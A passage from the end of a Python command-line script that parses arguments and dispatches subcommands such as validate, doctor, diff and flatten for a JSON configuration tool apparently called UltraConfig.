    p.add_argument("cpath", nargs="?", default=None, help="config.json path")

    args = ap.parse_args(argv)
    if args.cmd in ("validate", "show", "doctor", "upgrade", "flatten", "profile", "diff"):
        args.config = getattr(args, "cpath", None) or args.config or "config.json"
    if not args.cmd:
        ap.print_help()
        return 0
    if args.cmd == "init":
        return cmd_init(args)
    if args.cmd == "validate":
        return cmd_validate(args)
    if args.cmd == "show":
        return cmd_show(args)
    if args.cmd == "explain":
        return cmd_explain(args)
    if args.cmd == "profile":
        return cmd_profile(args)
    if args.cmd == "doctor":
        return doctor(args.config or "config.json", fix=args.fix)
    if args.cmd == "bypass":
        return cmd_bypass(args)
    if args.cmd == "upgrade":
        return cmd_upgrade(args)
    if args.cmd == "diff":
        return cmd_diff(args)
    if args.cmd == "selftest":
        return cmd_selftest(args)
    if args.cmd == "flatten":
        try:
            uc = UltraConfig(args.config)
        except Exception as e:
            err("load fail: %s" % e)
            return 2
        print(json.dumps({k: v for k, v in uc.flat.items() if k != "meta"}, indent=2))
        return 0
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        sys.exit(130)



